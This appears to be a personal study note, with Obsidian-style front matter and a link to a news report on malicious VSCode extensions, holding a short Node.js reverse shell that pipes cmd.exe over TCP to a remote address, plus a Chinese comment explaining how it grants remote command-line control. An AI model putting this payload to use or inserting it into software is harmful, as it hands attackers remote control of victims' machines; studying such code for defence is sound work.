---  
alias:  
creation_date: 2024-06-11 13:10  
tags: 
related:
- [[nodejs_idx]]

---  

ref: [Site Unreachable](https://www.bleepingcomputer.com/news/security/malicious-vscode-extensions-with-millions-of-installs-discovered/)


```js

let net = require("net");
let shell = exec("cmd.exe");
var tcpSocket = new net.socket();

tcpSocket.connect(9090, "192.168.71.132", () => {
  // remote 的 tcp socket pipe 到 local 的 shell 的 stdin
  tcpSocket.pipe(shell.stdin);

  // local 的 shell 的 stdout 和 stderr 都 pipe 到 remote 的 tcp socket
  shell.stdout.pipe(tcpSocket);
  shell.stderr.pipe(tcpSocket);

  // 因此，上面可以達到
});

/**
 * 這段程式碼的目的可以簡單總結為：
1. 在本地啟動一個 Windows 命令提示符（`cmd.exe`）。
2. 通過 TCP 連接將這個命令提示符與遠程伺服器進行連接。
3. 使得遠程伺服器可以向本地命令提示符發送指令並接收其執行結果。

這實際上是一種遠程控制技術，使得操作者可以在遠端伺服器上向本地主機發送命令並獲得執行回應，
類似於遠程桌面但僅限於命令行。
這在某些場合下，尤其是需要遠程系統管理和控制時，可能非常有用。
然而，這樣的代碼也可能用於不安全的活動，因此在使用和設置時必須特別小心，以防止未經授權的訪問。
 */

```